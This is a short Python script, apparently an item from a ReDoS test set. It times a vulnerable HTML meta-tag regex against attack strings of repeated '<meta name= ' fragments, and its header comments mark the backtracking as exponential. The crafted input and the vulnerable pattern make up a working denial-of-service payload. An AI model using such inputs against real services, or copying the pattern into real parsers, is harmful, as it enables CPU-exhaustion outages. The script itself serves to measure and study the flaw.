# 1519
# <meta[\s]+[^>]*?name[\s]?=[\s\"\']+(.*?)[\s\"\']+content[\s]?=[\s\"\']+(.*?)[\"\']+.*?>
# EXPONENT
# nums:4
# EXPONENT AttackString:""+"<meta name= "*256+"! _1SLQ_2"

import re
from time import perf_counter

regex = """<meta[\s]+[^>]*?name[\s]?=[\s\"\']+(.*?)[\s\"\']+content[\s]?=[\s\"\']+(.*?)[\"\']+.*?>"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "" + "<meta name= " * i * 1 + "! _1SLQ_2"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")